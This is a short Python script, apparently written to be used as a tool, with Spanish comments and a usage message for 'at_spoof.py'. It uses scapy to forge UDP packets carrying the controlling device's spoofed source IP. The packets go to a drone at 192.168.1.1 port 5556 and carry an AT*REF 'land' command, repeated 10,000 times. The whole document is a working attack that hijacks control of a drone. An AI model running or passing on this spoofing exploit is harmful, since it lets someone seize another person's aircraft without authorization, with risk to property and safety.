from scapy.all import *
from time import sleep
import sys, re


if len(sys.argv) < 2:
	print "Formato: sudo python at_spoof.py ip_dispositivo"
	exit()
else:
	patron = re.compile('\d{0,255}\.\d{0,255}\.\d{0,255}\.\d{0,255}')
	if patron.match(sys.argv[1]) is None:
		print "Formato: sudo python at_spoof.py ip_dispositivo"
		exit()


srcIP = sys.argv[1] # Ip del dispositivo
dstIP = '192.168.1.1' # IP del dron
srcPort = 5556 # Puerto origen
dstPort = 5556 # Puerto destino


at_ref_basic_code= 2 ** 28 + 2 ** 24 + 2 ** 22 + 2 ** 20 + 2 ** 18
at_land_code = at_ref_basic_code
at_take_off_code = at_ref_basic_code + 2 ** 9

payload = "AT*REF=1,"+str(at_land_code)+"\r"

spoofed_packet = IP(src=srcIP, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
for i in range(10000): # enviamos mil paquetes
	send(spoofed_packet)